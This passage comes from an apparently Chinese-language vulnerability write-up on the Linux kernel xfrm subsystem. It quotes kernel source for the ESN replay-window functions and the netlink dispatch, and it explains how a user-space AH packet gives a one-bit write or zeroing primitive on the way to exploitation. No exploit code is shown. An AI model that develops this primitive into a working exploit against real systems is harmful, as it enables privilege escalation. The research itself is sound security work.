&amp;seq);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			XFRM_INC_STATS(net, LINUX_MIB_XFRMINHDRERROR);</span><br><span class="line">			<span class="keyword">goto</span> drop;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (!err);</span><br><span class="line"></span><br><span class="line">	err = xfrm_rcv_cb(skb, family, x-&gt;type-&gt;proto, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> drop;</span><br><span class="line"></span><br><span class="line">	nf_reset(skb);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (decaps) &#123;</span><br><span class="line">		skb_dst_drop(skb);</span><br><span class="line">		netif_rx(skb);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> x-&gt;inner_mode-&gt;afinfo-&gt;transport_finish(skb, async);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">drop_unlock:</span><br><span class="line">	spin_unlock(&amp;x-&gt;lock);</span><br><span class="line">drop:</span><br><span class="line">	xfrm_rcv_cb(skb, family, x &amp;&amp; x-&gt;type ? x-&gt;type-&gt;proto : nexthdr, <span class="number">-1</span>);</span><br><span class="line">	kfree_skb(skb);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_replay.c#L434" target="_blank" rel="noopener">xfrm_replay_check_esn</a>函数中，首先找到的还是<code>x-&gt;replay_esn</code>成员，接着检查[1]处某<code>bit</code>是否为1，否则退出。首先可以分析出该<code>bit</code>的计算方法，是<code>nr&gt;&gt;5</code>，即<code>(nr / 32)</code>，而<code>bitnr =  nr % 32</code>，而<code>bmp</code>的类型为<code>u32</code>，即<code>bmp[i]</code>的大小为<code>4*8 bit</code>，不难发现，<code>bmp</code>的作用就是表示某个值是否被占用。取一个情况<code>bitnr = (pos - diff) % replay_esn-&gt;replay_window</code>，其中<code>pos = (replay_esn-&gt;seq - 1) % replay_esn-&gt;replay_window</code>，<code>diff = top - seq =replay_esn-&gt;seq - seq</code>，因此<code>bitnr = (seq - 1 )% replay_esn-&gt;replay_window</code>，即<code>AH</code>中的<code>seq</code>是否被处理过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">static int xfrm_replay_check_esn(struct xfrm_state *x,</span><br><span class="line">				 struct sk_buff *skb, __be32 net_seq)</span><br><span class="line">&#123;</span><br><span class="line">	unsigned int bitnr, nr;</span><br><span class="line">	u32 diff;</span><br><span class="line">	struct xfrm_replay_state_esn *replay_esn = x-&gt;replay_esn;</span><br><span class="line">	u32 pos;</span><br><span class="line">	u32 seq = ntohl(net_seq);</span><br><span class="line">	u32 wsize = replay_esn-&gt;replay_window;</span><br><span class="line">	u32 top = replay_esn-&gt;seq;</span><br><span class="line">	u32 bottom = top - wsize + 1;</span><br><span class="line"></span><br><span class="line">	if (!wsize)</span><br><span class="line">		return 0;</span><br><span class="line"></span><br><span class="line">	if (unlikely(seq == 0 &amp;&amp; replay_esn-&gt;seq_hi == 0 &amp;&amp;</span><br><span class="line">		     (replay_esn-&gt;seq &lt; replay_esn-&gt;replay_window - 1)))</span><br><span class="line">		goto err;</span><br><span class="line"></span><br><span class="line">	diff = top - seq;</span><br><span class="line"></span><br><span class="line">	if (likely(top &gt;= wsize - 1)) &#123;</span><br><span class="line">		/* A. same subspace */</span><br><span class="line">		if (likely(seq &gt; top) || seq &lt; bottom)</span><br><span class="line">			return 0;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		/* B. window spans two subspaces */</span><br><span class="line">		if (likely(seq &gt; top &amp;&amp; seq &lt; bottom))</span><br><span class="line">			return 0;</span><br><span class="line">		if (seq &gt;= bottom)</span><br><span class="line">			diff = ~seq + top + 1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (diff &gt;= replay_esn-&gt;replay_window) &#123;</span><br><span class="line">		x-&gt;stats.replay_window++;</span><br><span class="line">		goto err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pos = (replay_esn-&gt;seq - 1) % replay_esn-&gt;replay_window;</span><br><span class="line"></span><br><span class="line">	if (pos &gt;= diff)</span><br><span class="line">		bitnr = (pos - diff) % replay_esn-&gt;replay_window;</span><br><span class="line">	else</span><br><span class="line">		bitnr = replay_esn-&gt;replay_window - (diff - pos);</span><br><span class="line"></span><br><span class="line">	nr = bitnr &gt;&gt; 5;</span><br><span class="line">	bitnr = bitnr &amp; 0x1F;</span><br><span class="line">[1]	if (replay_esn-&gt;bmp[nr] &amp; (1U &lt;&lt; bitnr))</span><br><span class="line">		goto err_replay;</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">err_replay:</span><br><span class="line">	x-&gt;stats.replay++;</span><br><span class="line">err:</span><br><span class="line">	xfrm_audit_state_replay(x, skb, net_seq);</span><br><span class="line">	return -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_replay.c#L505" target="_blank" rel="noopener">xfrm_replay_advance_esn</a>函数中，共有三处对<code>bmp</code>的写操作，其中在[1]处对于某一个<code>bit</code>执行<code>&amp;0</code>，将导致某一个<code>bit</code>被置零。在[2]处，可以发现函数对从<code>bmp[0]</code>到<code>bmp[(replay_esn-&gt;replay_window - 1) &gt;&gt; 5]</code>块内存均置零，而[3]处，这可以对某一个<code>bit</code>写1。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">static void xfrm_replay_advance_esn(struct xfrm_state *x, __be32 net_seq)</span><br><span class="line">&#123;</span><br><span class="line">	unsigned int bitnr, nr, i;</span><br><span class="line">	int wrap;</span><br><span class="line">	u32 diff, pos, seq, seq_hi;</span><br><span class="line">	struct xfrm_replay_state_esn *replay_esn = x-&gt;replay_esn;</span><br><span class="line"></span><br><span class="line">	if (!replay_esn-&gt;replay_window)</span><br><span class="line">		return;</span><br><span class="line"></span><br><span class="line">	seq = ntohl(net_seq);</span><br><span class="line">	pos = (replay_esn-&gt;seq - 1) % replay_esn-&gt;replay_window;</span><br><span class="line">	seq_hi = xfrm_replay_seqhi(x, net_seq);</span><br><span class="line">	wrap = seq_hi - replay_esn-&gt;seq_hi;</span><br><span class="line"></span><br><span class="line">	if ((!wrap &amp;&amp; seq &gt; replay_esn-&gt;seq) || wrap &gt; 0) &#123;</span><br><span class="line">		if (likely(!wrap))</span><br><span class="line">			diff = seq - replay_esn-&gt;seq;</span><br><span class="line">		else</span><br><span class="line">			diff = ~replay_esn-&gt;seq + seq + 1;</span><br><span class="line"></span><br><span class="line">		if (diff &lt; replay_esn-&gt;replay_window) &#123;</span><br><span class="line">			for (i = 1; i &lt; diff; i++) &#123;</span><br><span class="line">				bitnr = (pos + i) % replay_esn-&gt;replay_window;</span><br><span class="line">				nr = bitnr &gt;&gt; 5;</span><br><span class="line">				bitnr = bitnr &amp; 0x1F;</span><br><span class="line">[1]				replay_esn-&gt;bmp[nr] &amp;=  ~(1U &lt;&lt; bitnr);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			nr = (replay_esn-&gt;replay_window - 1) &gt;&gt; 5;</span><br><span class="line">			for (i = 0; i &lt;= nr; i++)</span><br><span class="line">[2]				replay_esn-&gt;bmp[i] = 0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		bitnr = (pos + diff) % replay_esn-&gt;replay_window;</span><br><span class="line">		replay_esn-&gt;seq = seq;</span><br><span class="line"></span><br><span class="line">		if (unlikely(wrap &gt; 0))</span><br><span class="line">			replay_esn-&gt;seq_hi++;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		diff = replay_esn-&gt;seq - seq;</span><br><span class="line"></span><br><span class="line">		if (pos &gt;= diff)</span><br><span class="line">			bitnr = (pos - diff) % replay_esn-&gt;replay_window;</span><br><span class="line">		else</span><br><span class="line">			bitnr = replay_esn-&gt;replay_window - (diff - pos);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	nr = bitnr &gt;&gt; 5;</span><br><span class="line">	bitnr = bitnr &amp; 0x1F;</span><br><span class="line">[3]	replay_esn-&gt;bmp[nr] |= (1U &lt;&lt; bitnr);</span><br><span class="line"></span><br><span class="line">	if (xfrm_aevent_is_on(xs_net(x)))</span><br><span class="line">		x-&gt;repl-&gt;notify(x, XFRM_REPLAY_UPDATE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此，<strong>通过用户态空间发送一个<code>AH</code>数据包将导致，一个<code>bit</code>的内存写，或者一段空间的置零</strong>。</p>
<h1 id="漏洞触发与利用"><a href="#漏洞触发与利用" class="headerlink" title="漏洞触发与利用"></a>漏洞触发与利用</h1><h2 id="netlink套接字通信"><a href="#netlink套接字通信" class="headerlink" title="netlink套接字通信"></a>netlink套接字通信</h2><p>与熟悉的驱动或内核模块所使用的系统调用或<code>ioctl</code>机制不同，本漏洞触发使用过的是<code>netlink</code>通信机制。</p>
<blockquote>
<p>Netlink 是一种特殊的 socket，它是 Linux 所特有的，类似于 BSD 中的AF_ROUTE 但又远比它的功能强大。目前在Linux 内核中使用netlink 进行应用与内核通信的应用很多; 包括：路由 daemon（NETLINK_ROUTE），用户态 socket 协议（NETLINK_USERSOCK），防火墙（NETLINK_FIREWALL），netfilter 子系统（NETLINK_NETFILTER），内核事件向用户态通知（NETLINK_KOBJECT_UEVENT）， 通用 netlink（NETLINK_GENERIC）等。</p>
</blockquote>
<p>而基于<code>netlink</code>的内核通信与<code>socket</code>的通信方式一致，都是通过<code>sendto()，recvfrom()； sendmsg(), recvmsg()</code>的用户态<code>API</code>。</p>
<p>而发送到内核态的数据以协议包的形式进行解析，因此需要了解<code>xfrm</code>数据包的协议格式，其协议结构图及相关函数图示如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ========================================================================</span></span><br><span class="line"><span class="comment"> *         Netlink Messages and Attributes Interface (As Seen On TV)</span></span><br><span class="line"><span class="comment"> * ------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> *                          Messages Interface</span></span><br><span class="line"><span class="comment"> * ------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Message Format:</span></span><br><span class="line"><span class="comment"> *    &lt;--- nlmsg_total_size(payload)  ---&gt;</span></span><br><span class="line"><span class="comment"> *    &lt;-- nlmsg_msg_size(payload) -&gt;</span></span><br><span class="line"><span class="comment"> *   +----------+- - -+-------------+- - -+-------- - -</span></span><br><span class="line"><span class="comment"> *   | nlmsghdr | Pad |   Payload   | Pad | nlmsghdr</span></span><br><span class="line"><span class="comment"> *   +----------+- - -+-------------+- - -+-------- - -</span></span><br><span class="line"><span class="comment"> *   nlmsg_data(nlh)---^                   ^</span></span><br><span class="line"><span class="comment"> *   nlmsg_next(nlh)-----------------------+</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Payload Format:</span></span><br><span class="line"><span class="comment"> *    &lt;---------------------- nlmsg_len(nlh) ---------------------&gt;</span></span><br><span class="line"><span class="comment"> *    &lt;------ hdrlen ------&gt;       &lt;- nlmsg_attrlen(nlh, hdrlen) -&gt;</span></span><br><span class="line"><span class="comment"> *   +----------------------+- - -+--------------------------------+</span></span><br><span class="line"><span class="comment"> *   |     Family Header    | Pad |           Attributes           |</span></span><br><span class="line"><span class="comment"> *   +----------------------+- - -+--------------------------------+</span></span><br><span class="line"><span class="comment"> *   nlmsg_attrdata(nlh, hdrlen)---^</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Data Structures:</span></span><br><span class="line"><span class="comment"> *   struct nlmsghdr			netlink message header</span></span><br><span class="line"><span class="comment"> * ------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> *                          Attributes Interface</span></span><br><span class="line"><span class="comment"> * ------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Attribute Format:</span></span><br><span class="line"><span class="comment"> *    &lt;------- nla_total_size(payload) -------&gt;</span></span><br><span class="line"><span class="comment"> *    &lt;---- nla_attr_size(payload) -----&gt;</span></span><br><span class="line"><span class="comment"> *   +----------+- - -+- - - - - - - - - +- - -+-------- - -</span></span><br><span class="line"><span class="comment"> *   |  Header  | Pad |     Payload      | Pad |  Header</span></span><br><span class="line"><span class="comment"> *   +----------+- - -+- - - - - - - - - +- - -+-------- - -</span></span><br><span class="line"><span class="comment"> *                     &lt;- nla_len(nla) -&gt;      ^</span></span><br><span class="line"><span class="comment"> *   nla_data(nla)----^                        |</span></span><br><span class="line"><span class="comment"> *   nla_next(nla)-----------------------------'</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Data Structures:</span></span><br><span class="line"><span class="comment"> *   struct nlattr			netlink attribute header</span></span><br></pre></td></tr></table></figure>
<p>从上图可以看出，<strong>发送到内核的数据需要如下形式<code>nlmsghdr</code> + <code>Family Header</code> + <code>n * (nla + data)</code>。</strong></p>
<p>首先从<code>xfrm_netlink_rcv</code>函数中调用<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/netlink/af_netlink.c#L2275" target="_blank" rel="noopener">netlink_rcv_skb</a>函数，会检查<code>nlmsg_type</code>及<code>nlmsg_len</code>范围，并交由<code>cb</code>函数处理，其赋值为<code>xfrm_user_rcv_msg</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">netlink_rcv_skb</span><span class="params">(struct sk_buff *skb, <span class="keyword">int</span> (*cb)</span><span class="params">(struct sk_buff *,</span></span></span><br><span class="line">						     struct nlmsghdr *))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (skb-&gt;len &gt;= nlmsg_total_size(<span class="number">0</span>)) &#123;</span><br><span class="line">		<span class="keyword">int</span> msglen;</span><br><span class="line"></span><br><span class="line">		nlh = nlmsg_hdr(skb);</span><br><span class="line">		err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (nlh-&gt;nlmsg_len &lt; NLMSG_HDRLEN || skb-&gt;len &lt; nlh-&gt;nlmsg_len)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Only requests are handled by the kernel */</span></span><br><span class="line">		<span class="keyword">if</span> (!(nlh-&gt;nlmsg_flags &amp; NLM_F_REQUEST))</span><br><span class="line">			<span class="keyword">goto</span> ack;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Skip control messages */</span></span><br><span class="line">		<span class="keyword">if</span> (nlh-&gt;nlmsg_type &lt; NLMSG_MIN_TYPE)</span><br><span class="line">			<span class="keyword">goto</span> ack;</span><br><span class="line"></span><br><span class="line">		err = cb(skb, nlh);</span><br><span class="line">		<span class="keyword">if</span> (err == -EINTR)</span><br><span class="line">			<span class="keyword">goto</span> skip;</span><br><span class="line"></span><br><span class="line">ack:</span><br><span class="line">		<span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_ACK || err)</span><br><span class="line">			netlink_ack(skb, nlh, err);</span><br><span class="line"></span><br><span class="line">skip:</span><br><span class="line">		msglen = NLMSG_ALIGN(nlh-&gt;nlmsg_len);</span><br><span class="line">		<span class="keyword">if</span> (msglen &gt; skb-&gt;len)</span><br><span class="line">			msglen = skb-&gt;len;</span><br><span class="line">		skb_pull(skb, msglen);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L2444" target="_blank" rel="noopener">xfrm_user_rcv_msg</a>函数中，会根据<code>nlmsg_type</code>到<code>xfrm_dispatch</code>中查找对应要调用的函数，并在[2]处检查对应需要的权限，而在[3]处会根据<code>nla</code>中参数类型，来初始化一个<code>** attr</code>，作为用户输入参数的索引。最终调用<code>link-&gt;doit</code>去执行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">xfrm_user_rcv_msg</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *nlh)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> = <span class="title">sock_net</span>(<span class="title">skb</span>-&gt;<span class="title">sk</span>);</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attrs</span>[<span class="title">XFRMA_MAX</span>+1];</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xfrm_link</span> *<span class="title">link</span>;</span></span><br><span class="line">	<span class="keyword">int</span> type, err;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">	<span class="keyword">if</span> (in_compat_syscall())</span><br><span class="line">		<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	type = nlh-&gt;nlmsg_type;</span><br><span class="line">	<span class="keyword">if</span> (type &gt; XFRM_MSG_MAX)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	type -= XFRM_MSG_BASE;</span><br><span class="line">[<span class="number">1</span>]	link = &amp;xfrm_dispatch[type];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* All operations require privileges, even GET */</span></span><br><span class="line">[<span class="number">2</span>]	<span class="keyword">if</span> (!netlink_net_capable(skb, CAP_NET_ADMIN)) <span class="comment">//检查进程权限</span></span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((type == (XFRM_MSG_GETSA - XFRM_MSG_BASE) ||</span><br><span class="line">	     type == (XFRM_MSG_GETPOLICY - XFRM_MSG_BASE)) &amp;&amp;</span><br><span class="line">	    (nlh-&gt;nlmsg_flags &amp; NLM_F_DUMP)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (link-&gt;dump == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">netlink_dump_control</span> <span class="title">c</span> = &#123;</span></span><br><span class="line">				.dump = link-&gt;dump,</span><br><span class="line">				.done = link-&gt;done,</span><br><span class="line">			&#125;;</span><br><span class="line">			<span class="keyword">return</span> netlink_dump_start(net-&gt;xfrm.nlsk, skb, nlh, &amp;c);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">[<span class="number">3</span>]	err = nlmsg_parse(nlh, xfrm_msg_min[type], attrs,</span><br><span class="line">			  link-&gt;nla_max ? : XFRMA_MAX,</span><br><span class="line">			  link-&gt;nla_pol ? : xfrma_policy);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (link-&gt;doit == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> link-&gt;doit(skb, nlh, attrs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从<code>xfrm_dispatch</code>可见，我们所需的<code>XFRM_MSG_NEWSA</code>及<code>XFRM_MSG_NEWAE</code>，仅需将<code>nlmsg_type</code>设置为相应值即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">xfrm_dispatch[XFRM_NR_MSGTYPES] = &#123;</span><br><span class="line">	[XFRM_MSG_NEWSA       - XFRM_MSG_BASE] = &#123; .doit = xfrm_add_sa        &#125;,</span><br><span class="line">	[XFRM_MSG_DELSA       - XFRM_MSG_BASE] = &#123; .doit = xfrm_del_sa        &#125;,</span><br><span class="line">	[XFRM_MSG_GETSA       - XFRM_MSG_BASE] = &#123; .doit = xfrm_get_sa,</span><br><span class="line">						   .dump = xfrm_dump_sa,</span><br><span class="line">						   .done = xfrm_dump_sa_done  &#125;,</span><br><span class="line">	[XFRM_MSG_NEWPOLICY   - XFRM_MSG_BASE] = &#123; .doit = xfrm_add_policy    &#125;,</span><br><span class="line">	[XFRM_MSG_DELPOLICY   - XFRM_MSG_BASE] = &#123; .doit = xfrm_get_policy    &#125;,</span><br><span class="line">	[XFRM_MSG_GETPOLICY   - XFRM_MSG_BASE] = &#123; .doit = xfrm_get_policy,</span><br><span class="line">						   .dump = xfrm_dump_policy,</span><br><span class="line">						   .done = xfrm_dump_policy_done &#125;,</span><br><span class="line">	[XFRM_MSG_ALLOCSPI    - XFRM_MSG_BASE] = &#123; .doit = xfrm_alloc_userspi &#125;,</span><br><span class="line">	[XFRM_MSG_ACQUIRE     - XFRM_MSG_BASE] = &#123; .doit = xfrm_add_acquire   &#125;,</span><br><span class="line">	[XFRM_MSG_EXPIRE      - XFRM_MSG_BASE] = &#123; .doit = xfrm_add_sa_expire &#125;,</span><br><span class="line">	[XFRM_MSG_UPDPOLICY   - XFRM_MSG_BASE] = &#123; .doit = xfrm_add_policy    &#125;,</span><br><span class="line">	[XFRM_MSG_UPDSA       - XFRM_MSG_BASE] = &#123; .doit = xfrm_add_sa        &#125;,</span><br><span class="line">	[XFRM_MSG_POLEXPIRE   - XFRM_MSG_BASE] = &#123; .doit = xfrm_add_pol_expire&#125;,</span><br><span class="line">	[XFRM_MSG_FLUSHSA     - XFRM_MSG_BASE] = &#123; .doit = xfrm_flush_sa      &#125;,</span><br><span class="line">	[XFRM_MSG_FLUSHPOLICY - XFRM_MSG_BASE] = &#123; .doit = xfrm_flush_policy  &#125;,</span><br><span class="line">	[XFRM_MSG_NEWAE       - XFRM_MSG_BASE] = &#123; .doit = xfrm_new_ae  &#125;,</span><br><span class="line">	[XFRM_MSG_GETAE       - XFRM_MSG_BASE] = &#123; .doit = xfrm_get_ae  &#125;,</span><br><span class="line">	[XFRM_MSG_MIGRATE     - XFRM_MSG_BASE] = &#123; .doit = xfrm_do_migrate    &#125;,</span><br><span class="line">	[XFRM_MSG_GETSADINFO  - XFRM_MSG_BASE] = &#123; .doit = xfrm_get_sadinfo   &#125;,</span><br><span class="line">	[XFRM_MSG_NEWSPDINFO  - XFRM_MSG_BASE] = &#123; .doit = xfrm_set_spdinfo,</span><br><span class="line">						   .nla_pol = xfrma_spd_policy,</span><br><span class="line">						   .nla_max = XFRMA_SPD_MAX &#125;,</span><br><span class="line">	[XFRM_MSG_GETSPDINFO  - XFRM_MSG_BASE] = &#123; .doit = xfrm_get_spdinfo   &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
